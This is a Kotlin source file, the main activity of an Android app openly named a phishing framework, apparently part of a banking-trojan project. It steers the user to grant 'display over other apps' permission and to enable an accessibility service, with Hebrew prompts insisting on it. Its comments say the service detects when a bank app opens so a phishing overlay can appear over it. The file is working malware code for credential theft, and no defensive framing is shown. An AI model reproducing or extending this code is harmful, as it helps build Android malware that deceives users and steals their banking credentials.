package com.example.phishingframework.activities

import android.content.ComponentName
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.provider.Settings
import android.text.TextUtils
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.example.phishingframework.R
import com.example.phishingframework.services.PhishingAccessibilityService

//This is the main Activity of the application, which serves to direct the user to grant critical permissions for the framework operation:
//Overlay permission – to allow displaying the PhishingOverlayActivity over other applications.
//Accessibility service activation – to allow PhishingAccessibilityService to receive window change events and detect opening of the bank application.
class MainActivity : AppCompatActivity() {

    //Monitors the result of the request for "display over other apps" permission
    private lateinit var overlayRequestLauncher: ActivityResultLauncher<Intent>
    // Monitors the result of the request to activate the accessibility service
    private lateinit var accessibilityRequestLauncher: ActivityResultLauncher<Intent>

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Register the ActivityResult to handle the result of the Overlay permission request
        overlayRequestLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) {
            // After the user returns from settings, check again if permission is granted
            if (!Settings.canDrawOverlays(this)) {
                Toast.makeText(
                    this,
                    "אין הרשאה להציג מעל אפליקציות אחרות",
                    Toast.LENGTH_LONG
                ).show()
            }
        }

        // Register the ActivityResult to handle the result of the AccessibilityService activation request
        accessibilityRequestLauncher = registerForActivityResult(
            ActivityResultContracts.StartActivityForResult()
        ) {
            if (!isAccessibilityServiceEnabled()) {
                Toast.makeText(
                    this,
                    "יש להפעיל את שירות הנגישות PhishingAccessibilityService",
                    Toast.LENGTH_LONG
                ).show()
            }
        }

        // Step one: Check and permission for Overlay display
        if (!Settings.canDrawOverlays(this)) {
            val overlayIntent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            overlayRequestLauncher.launch(overlayIntent)
        }

        // Step two: Check if our accessibility service is active, if not - direct the user to accessibility settings
        if (!isAccessibilityServiceEnabled()) {
            val accIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            accessibilityRequestLauncher.launch(accIntent)
        }
    }


     //Checks if our AccessibilityService (PhishingAccessibilityService)
     //is enabled and integrated in Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
    private fun isAccessibilityServiceEnabled(): Boolean {
        val expectedComponent = ComponentName(
            this,
            PhishingAccessibilityService::class.java
        ).flattenToString()

        val enabledServices =
            Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
                ?: return false

         // List of enabled services is separated by semicolons
         val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServices)
        for (service in colonSplitter) {
            if (service.equals(expectedComponent, ignoreCase = true)) {
                return true
            }
        }
        return false
    }
}
